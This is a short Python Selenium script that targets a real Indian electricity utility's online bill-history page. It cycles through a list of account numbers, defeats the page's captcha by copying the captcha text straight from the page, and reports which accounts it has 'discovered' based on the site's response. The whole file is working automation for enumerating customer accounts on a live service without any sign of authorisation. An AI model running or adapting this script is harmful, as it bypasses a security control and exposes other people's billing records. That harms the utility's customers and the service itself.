from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import NoAlertPresentException
import time

options = Options()
# options.add_argument("--headless=new")

driver = webdriver.Chrome(options=options)

account_numbers = [
    "1234",
    "0917550000",
    "9738443251",
]

try:
    driver.get("https://epayment.dhbvn.org.in/b2cviewBillHistory.aspx")
    time.sleep(2)

    for account_number in account_numbers:
        account_input_element = driver.find_element(By.ID, "txtAccountNo")
        account_input_element.clear()
        account_input_element.send_keys(account_number)

        captcha_element = driver.find_element(By.ID, "code")
        captcha_input_element = driver.find_element(By.ID, "txtcaptcha")
        captcha_input_element.clear()
        captcha_input_element.send_keys(captcha_element.text)

        proceed_button_element = driver.find_element(By.ID, "btnsubmit")

        old_url = driver.current_url
        proceed_button_element.click()
        time.sleep(1)

        try:
            alert = driver.switch_to.alert
            alert.accept()
            print(f"Account number {account_number} not found (alert)")
            continue
        except NoAlertPresentException:
            pass

        new_url = driver.current_url
        if old_url != new_url:
            print(f"Account number {account_number} discovered")
            driver.get(old_url)
            time.sleep(2)
        else:
            print(f"Account number {account_number} not found")

finally:
    driver.quit()
